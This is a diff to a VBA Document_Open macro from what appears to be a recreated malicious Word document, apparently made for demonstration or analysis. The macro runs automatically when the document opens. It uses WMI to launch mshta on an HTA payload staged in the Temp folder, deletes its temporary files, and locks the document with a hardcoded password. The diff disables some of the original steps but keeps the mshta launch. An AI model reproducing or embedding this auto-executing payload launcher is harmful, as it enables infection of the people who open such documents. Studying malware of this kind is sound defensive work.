@@ -62,12 +62,13 @@ Sub Document_Open()
     Set objWMIService = GetObject(Calc)
     ' For some reason, Value & " " & CreatedImageBMPFilePath doesn't work, the string concatenation fails
     ' when concatenating Value & " " & TempPath ... and simply results in Value being the output.
-    objWMIService.Create Value & " " & CreatedImageBMPFilePath
+    'objWMIService.Create Value & " " & CreatedImageBMPFilePath
 
     ' As a workaround for demonstration purposes the following can be used.
     ' Placing the HTA payload in a separate file and providing its path here
-    ' side-steps the failing extraction through WIA_ConvertImage
-    objWMIService.Create "mshta" & " " & Environ(Temp) & "\" & "index.zip"
+    ' side-steps the failing extraction through WIA_ConvertImage and the failing
+    ' string concatenation
+    objWMIService.Create "mshta" & " " & Environ("Temp") & "\" & "index.zip"
 
     Kill TempPath & "\*.*"
     RmDir TempPath
@@ -78,7 +79,8 @@ End Sub
 
 ' Makes the document protected, so no changes can be made to it.
 Private Sub Show()
-    Application.ActiveDocument.Unprotect Password:="taifehjRTYB$%^45"
+    ' Fails in recreated document - original document was likely protected
+    'Application.ActiveDocument.Unprotect Password:="taifehjRTYB$%^45"
     ThisDocument.PageSetup.PageWidth = 612
     ThisDocument.PageSetup.PageHeight = 792
     Set DocPageSetup = ThisDocument.PageSetup
@@ -86,8 +88,9 @@ Private Sub Show()
     DocPageSetup.RightMargin = 72
     DocPageSetup.TopMargin = 85.05
     DocPageSetup.BottomMargin = 72
-    Application.ActiveDocument.Shapes(1).Visible = False
-    Bookmarks("main").Range.Font.Hidden = False
+    ' Fails in recreated document
+    'Application.ActiveDocument.Shapes(1).Visible = False
+    'Bookmarks("main").Range.Font.Hidden = False
     ActiveDocument.ActiveWindow.View.Type = wdPrintView
     Application.ActiveDocument.Protect Type:=wdAllowOnlyComments, Password:="taifehjRTYB$%^45"
 End Sub
